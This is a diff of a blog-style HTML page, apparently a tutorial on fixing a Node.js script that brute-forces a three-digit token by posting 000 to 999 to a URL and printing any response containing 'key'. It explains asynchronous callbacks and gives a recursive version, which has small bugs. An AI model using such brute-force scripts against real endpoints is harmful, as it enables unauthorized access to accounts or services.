@@ -65,7 +65,7 @@
 <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">blast</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
   <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">j</span> <span class="o">&lt;</span> <span class="nx">blast</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
     <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">k</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">k</span> <span class="o">&lt;</span> <span class="nx">blast</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">k</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
-      <span class="nx">request</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="p">{</span><span class="nx">form</span><span class="o">:</span><span class="p">{</span> <span class="nx">token</span> <span class="nx">i</span> <span class="o">+</span> <span class="nx">j</span> <span class="o">+</span> <span class="nx">k</span> <span class="p">}},</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">body</span><span class="p">)</span> <span class="p">{</span>
+      <span class="nx">request</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="p">{</span><span class="nx">form</span><span class="o">:</span><span class="p">{</span> <span class="nx">token</span><span class="o">:</span> <span class="nx">i</span> <span class="o">+</span> <span class="nx">j</span> <span class="o">+</span> <span class="nx">k</span> <span class="p">}},</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">body</span><span class="p">)</span> <span class="p">{</span>
         <span class="k">if</span> <span class="p">(</span><span class="nx">body</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s1">&#39;key&#39;</span><span class="p">)</span> <span class="o">!==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
           <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">i</span> <span class="o">+</span> <span class="nx">j</span> <span class="o">+</span> <span class="nx">k</span><span class="p">);</span>
           <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">body</span><span class="p">);</span>
@@ -75,7 +75,52 @@
   <span class="p">}</span>
 <span class="p">}</span>
 </pre></div>
-<p>OK, we have our magical blast payload ready. </p>
+<p>OK, we have our first magical blast payload ready. 
+Here&#39;s what you think will happen:</p>
+
+<ol>
+<li>in a for loop, post token from 000 to 999</li>
+<li>if find the respond body with keywords <strong>key</strong>, print token and body</li>
+</ol>
+<p>However, <code>Node</code> is asynchronous. The request post will return before it even starts 
+the post. It will return back to your for loop. And your for loop will move on to the
+next file. And the next one.</p>
+<p>We have to wait for the callback. When it&#39;s called, only then do post our next
+number token. In other words, we need to call another function inside our callback.
+And this function needs to start post next number token. Hence, maybe we need
+a recursive function to do this.</p>
+<p>A nice little recursive pattern we can use for this case:</p>
+
+<pre><code>var request = require('request');
+var url = 'www.example.com/hack';
+function blast(num) {
+    if (num &gt;= 000 &amp;&amp; num &lt;= 999) {
+        request.post(url, {form:{ token: num }}, function (err, res, body) {
+            if (body.indexOf('key') !== -1) {
+              console.log(i + j + k);
+              console.log(body);
+            } else {
+                blast(++num);
+            }
+        })
+    }
+}
+blast(000);</code></pre>
+<p>In short, the pattern can be this:</p>
+
+<pre><code>repeater(i) {
+    if (statement) {
+        aysnc(function () {
+            repeater(++i)
+        })
+    }
+}</code></pre>
+
+<h2 id="toc_0">Referemce</h2>
+
+<ul>
+<li><a href="http://www.richardrodger.com/2011/04/21/node-js-how-to-write-a-for-loop-with-callbacks/#.VCJ-ciuSy8Q">How to Write a For Loop With Callbacks</a></li>
+</ul>
 
     </div>
 
